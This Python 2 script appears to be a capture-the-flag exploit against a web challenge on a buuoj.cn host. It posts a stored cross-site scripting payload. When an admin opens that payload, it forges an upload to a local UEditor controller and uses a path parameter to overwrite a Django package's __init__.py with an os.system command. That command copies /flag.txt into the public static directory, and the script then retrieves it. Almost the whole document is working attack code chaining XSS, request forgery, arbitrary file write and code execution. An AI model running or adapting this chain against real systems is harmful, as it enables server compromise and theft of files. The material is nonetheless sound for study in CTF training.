#!/usr/bin/python2.7
#coding:utf-8

from sys import *
import requests
import re
import time
host = 'web56.buuoj.cn'
port = 80
timeout = 30

#get csrfmiddlewaretoken
def get_token():
    url='http://'+host+':'+str(port)+r'/api/get_token'
    print url
    req=requests.get(url,timeout=timeout)
    json=req.json()
    print json
    # exit()
    #print json['token']
    return json['token']


def add_paper(token):
    content=r'''<script>function submitRequest()
{
var xhr = new XMLHttpRequest();
xhr.open("POST", "http:\/\/127.0.0.1:8000\/admin\/ueditor\/controller\/?imagePathFormat=.\/CISCN\/__init__.py&filePathFormat=uploads%2Ffiles%2F&action=uploadimage&encode=utf-8", true);
xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=--------304576285")
xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8,application\/signed-exchange;v=b3");
xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
xhr.withCredentials = true;
var body = "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"id\"\r\n" +
  "\r\n" +
  "WU_FILE_0\r\n" +
  "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"name\"\r\n" +
  "\r\n" +
  "Chr.jpg\r\n" +
  "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"type\"\r\n" +
  "\r\n" +
  "image/jpeg\r\n" +
  "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"lastModifidDate\"\r\n" +
  "\r\n" +
  "The Jul 14 2009 13:32:31 GMT 0000\r\n" +
  "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"size\"\r\n" +
  "\r\n" +
  "0123\r\n" +
  "----------304576285\r\n" +
  "Content-Disposition: form-data; name=\"upfile\"; filename=\"Chr.jpg\"\r\n" +
  "Content-Type: image/jepg\r\n" +
  "\r\n" +
  "import os;os.system(\"cp /flag.txt /usr/local/lib/python2.7/site-packages/django/contrib/admin/static/\")\r\n" +
  "----------304576285--\r\n" +
  "\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i);
xhr.send(new Blob([aBody]));
}

window.onload=submitRequest();
</script>
    '''
    #print(content)
    url='http://'+host+':'+str(port)+r'/api/add_paper'
    cookie={
        'csrftoken':token,
    }
    body={
        'csrfmiddlewaretoken':token,
        'content':content,
    }
    req=requests.post(url,data=body,cookies=cookie,timeout=timeout)
    #print req.text
    return req.json()['url']

def getshell():
    url='http://'+host+':'+str(port)
    url1=url+r'/api/send_paper'
    print url1
    #get token
    token=get_token()
    print token
    # exit()
    #get the key
    uri=add_paper(token)
    key=uri[1:]
    print(key)
    # exit()
    body={
        'csrfmiddlewaretoken':token,
        'key':key,
    }
    req=requests.post(url1,data=body,cookies={'csrftoken':token},timeout=timeout)
    #delay 1s ensure the flag move to staticfiles
    time.sleep(5)
    req2=requests.get(url+'/static/flag.txt')
    if 'flag' in req2.text:
        return req2.text
    else:
        return 'try again'

if __name__ == '__main__':
    print(getshell())
